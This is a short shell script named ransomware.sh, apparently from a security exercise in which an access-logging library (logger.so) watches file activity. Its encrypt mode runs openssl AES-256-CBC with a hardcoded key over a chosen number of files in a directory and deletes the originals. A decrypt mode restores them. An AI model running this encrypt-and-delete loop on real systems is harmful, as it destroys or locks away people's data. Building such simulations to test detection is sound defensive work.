#!/bin/sh
# LD_PRELOAD=./logger.so ./ransomware.sh [-c -e -d] {directory} {num_files}
# ex.: LD_PRELOAD=./logger.so ./ransomware.sh -c ./test 10

i=0

if [ $1 = "-c" ]
then
    ./test_aclog $2 $3 # create files
elif [ $1 = "-e" ]
then
    for file in ${2}/*;
    do
        # check if requested num of files have been encrypted
        if [ $i -eq $3 ]
        then
            break
        else
            i=$((i+1))
        fi
        # check if file exists
        if [ ! -f ${file} ]
        then
            continue
        fi
        
        openssl aes-256-cbc -e -a -iter 1000 -in ${file} -out ${file}.encrypt -k 1234 # encrypt
        rm ${file} # and delete unencrypted files
        echo "${file}"
    done
elif [ $1 = "-d" ]  
then
    for file in ${2}/*.encrypt;
    do
        # check if requested num of files have been decrypted
        if [ $i -eq $3 ]
        then
            break
        else
            i=$((i+1))
        fi
        # check if file exists
        if [ ! -f ${file} ]
        then
            continue
        fi
        openssl aes-256-cbc -d -a -iter 1000 -in $file -out ${file%.encrypt} -k 1234 # decrypt
        rm ${file} # and delete encrypted files
        echo "${file}"
    done
fi